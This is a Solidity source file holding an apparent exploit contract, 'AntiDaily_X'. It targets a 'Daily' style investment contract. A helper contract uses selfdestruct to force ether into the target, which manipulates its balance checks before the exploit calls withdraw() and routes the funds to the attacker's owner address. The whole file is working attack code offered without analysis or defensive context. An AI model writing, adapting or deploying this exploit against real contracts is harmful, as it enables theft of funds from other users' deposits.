pragma solidity ^0.5.0;

contract Pass {
    constructor(address payable targetAddress) public payable {
        selfdestruct(targetAddress);
    }
}

interface TargetInterface {
    function checkBalance() external view returns (uint256);
    function withdraw() external returns (bool);
}

contract AntiDaily_X {
    address payable private owner;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor() public payable {
        owner = msg.sender;
    }
    
    function investTargetMsgValue(address payable targetAddress) public payable {
        investTargetAmount(targetAddress, msg.value);
    }

    function investTargetAmount(address payable targetAddress, uint256 amount) public payable onlyOwner {
        (bool success, bytes memory data) = targetAddress.call.value(amount)("");
        require(success);
        data; // make compiler happy
    }

    function withdrawTarget(address payable targetAddress, bool toOwner) public payable onlyOwner {
        uint256 targetBalanceTotal = targetAddress.balance;
        TargetInterface target = TargetInterface(targetAddress);
        uint256 targetBalanceUser = target.checkBalance();

        if (targetBalanceUser >= targetBalanceTotal) {
            uint256 needAdd = targetBalanceUser - targetBalanceTotal + 1 wei;
            require(address(this).balance >= needAdd);
            (new Pass).value(needAdd)(targetAddress);
        }

        target.withdraw();
        
        if (toOwner) {
            owner.transfer(address(this).balance);
        }
    }
    
    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    function kill() public onlyOwner {
        selfdestruct(owner);
    }

    function () external payable {
    }
    
}